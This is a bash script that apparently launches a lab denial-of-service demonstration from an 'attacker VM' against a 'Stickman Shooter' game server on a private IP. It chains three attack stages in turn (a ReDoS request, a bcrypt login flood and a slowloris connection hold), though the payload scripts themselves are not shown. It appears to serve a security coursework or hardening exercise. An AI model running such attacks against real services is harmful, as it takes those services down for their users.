#!/usr/bin/env bash
# Multi-layer DoS launch script (run from the attacker VM).
# Usage: ./run_all.sh [base_url]
set -e
BASE="${1:-http://192.168.56.1:3000}"

echo "############################################################"
echo "# Stickman Shooter - Multi-layer DoS demo"
echo "# Target: $BASE"
echo "############################################################"

echo; echo "== 0. deps check =="
python3 -c "import requests; print('python-requests OK')" || { echo "install: pip3 install requests"; exit 1; }

echo; echo "== LAYER 1 - ReDoS (single request freezes the server) =="
python3 redos.py "$BASE"

echo
echo ">> The vulnerable server should now be frozen."
echo ">> Restart it before Layer 2: Ctrl+C then 'node server.js' on the host."
read -rp "Press Enter once the server is back up..."

echo; echo "== LAYER 2 - login bcrypt flood (resource exhaustion) =="
python3 login_flood.py "$BASE" 60 20

echo; echo "== LAYER 3 - slowloris (connection hold, 10 s run) =="
timeout 10 python3 slowloris.py "$BASE" 200 || true

echo
echo "== done =="
echo "Evidence + hardened replay: see dos/README.md"